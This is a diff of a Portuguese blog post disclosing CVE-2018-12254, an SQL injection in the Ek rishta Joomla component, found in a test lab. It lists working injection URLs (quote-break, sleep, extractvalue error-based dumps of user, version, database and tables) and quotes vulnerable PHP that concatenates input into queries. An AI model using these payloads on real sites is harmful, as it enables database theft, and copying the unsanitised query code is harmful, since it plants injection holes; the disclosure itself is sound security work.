@@ -1,22 +1,76 @@
 ---
-title: "Sql Injection Ek rishta Component"
+title: "CVE-2018-12254 - Sql Injection Ek rishta Component"
 layout: post
 date: 2018-06-11
 categories: vulnerabilities
 ---
 
+A vulnerabilidade foi encontrada de uma forma um pouco inusitada, a alguns dias o Daybson estava subindo um laboratorio de teste novo, quando me chamou para testa-lo, eu em particular não sabia que vulnerabilidade havia no laboratorio, apenas loguei e fui testar. Notei que na seguinte aba eu tinha o nome do usuario na url e me pareceu um pouco estranho, talvez fosse gerado um novo arquivo durante o registro ou algo assim, mas na verdade notei que aquilo nao era um arquivo, era realmente um parametro da url.
 
-PoC:
-http://172.16.1.253:8080/index.php/home/requested_user/Sent%20interest/1'or%20a%23
-http://172.16.1.253:8080/index.php/home/requested_user/Sent%20interest/1'or%20sleep(5)%23
+<br>
+O teste inicial foi lógicamente foi adicionar uma aspas simples e ver o que iria me retornar:
+url:http://[HOST]/index.php/home/requested_user/Sent%20interest/1'or%20a%23
+<img src="0x1.png">
+<br>
+Então, seguindo o erro, temos um Sql Injectio aqui!
+Fazendo mais um teste para confirmar, conseguimos ter a certeza disso:
+<br>
+url:http://[HOST]/index.php/home/requested_user/Sent%20interest/1'or%20sleep(5)%23
+<img src="0x3.png">
+Até este ponto estava tudo bem, porém notei uma limitção ao tentar dumpar a db no modo clássico, até mesmo usando blind.
 
-Vulnerable Code: file -> router.php
+Me pareceu estranho não conseguir dumpar tudo, porém, entendi que eu estava limitado, fazendo algumas pesquisas vi que a maneira seria fazer o dump usando error based com XPATH Injection.
+<br>
+url:http://[HOST]/index.php/home/requested_user/Sent%20interest/1'%20or%20extractvalue(1,user())%20%23
+<img src="0x4.png">
+<br>
+url:http://[HOST]/index.php/home/requested_user/Sent%20interest/1'%20or%20extractvalue(1,version())%20%23
+<img src="0x5.png">
+<br>
+url:http://[HOST]/index.php/home/requested_user/Sent%20interest/1'%20or%20extractvalue(0x0a,concat(0x0a,(select%20database())))%20%23
+<img src="0x6.png">
+<br>
+url:http://[HOST]/index.php/home/requested_user/Sent%20interest/1'%20or%20extractvalue(0x0a,concat(0x0a,(select%20table_name%20from%20information_schema.tables)))%20%23
+<img src="0x7.png">
+Bom, a partir deste ponto, a melhor forma seria criar um script para fazer o dump!
+<br>
+Depois disso, eu ainda assim fiquei curioso para saber como que o componente estava capturando esta parte da url, então baixei o código dele e vasculhei até encontrar o seguinte trecho:
+<br>
+<code>router.php</code>
+<br>
 {% highlight php %}
-	if(!empty($segments[2]) && $segments[0]=='requested_user') {
-		$c_id	= EkrishtaUsrID($segments[2]); 
-		if($segments[1] == "Sent interest")
-			$vars['rid']	= $c_id;
-		else
-			$vars['cid']	= $c_id;
-	}
+238 - if(!empty($segments[2]) && $segments[0]=='requested_user') {
+239 - 	$c_id	= EkrishtaUsrID($segments[2]); 
+240 - 	if($segments[1] == "Sent interest")
+241 -	  $vars['rid'] = $c_id;
+242 -	else
+243 -	  $vars['cid'] = $c_id;
+244 - }
+{% endhighlight %}
+
+Fazendo uma analise rapida, sabemos que o <code>$c_id</code> esta capturando o segmento que está o nosso nome de usuario e adicionando ele a um array ( <code>$vars</code>), podemos basicamente adivinhar que a função <code>EkrishtaUsrID()</code> está buscando o nosso id ou o nome do usuario no banco de dados, mas vamos ver o que realmente ela está fazendo.
+
+<br>
+
+Fazendo uma procura pela função <code>EkrishtaUsrID()</code>, encontrei ela presente no mesmo arquivo e é possivel ver que que existe uma falta de sanatização nas linhas <code>295</code> e <code>305</code>.
+{% highlight php %}
+291 - function EkrishtaUsrName($uid)
+292 - {
+293 -
+294 -	 $db = JFactory::getDBO();
+295 -	 $sql = "SELECT `username` FROM #__users WHERE `id`='". $uid."'";
+296 -	 $db->setQuery($sql);
+297 - 	 return $db->loadResult();
+298 -	
+299 - }
+300 - 
+301 - function EkrishtaUsrID($uid_name)
+302 - {
+303 - 
+304 - 	 $db = JFactory::getDBO();
+305 -	 $sql = "SELECT `id` FROM #__users WHERE `username`= '" .$uid_name."'";
+306 -	 $db->setQuery($sql);
+307 -	 return $db->loadResult();
+308 -      
+309 - }
 {% endhighlight %}
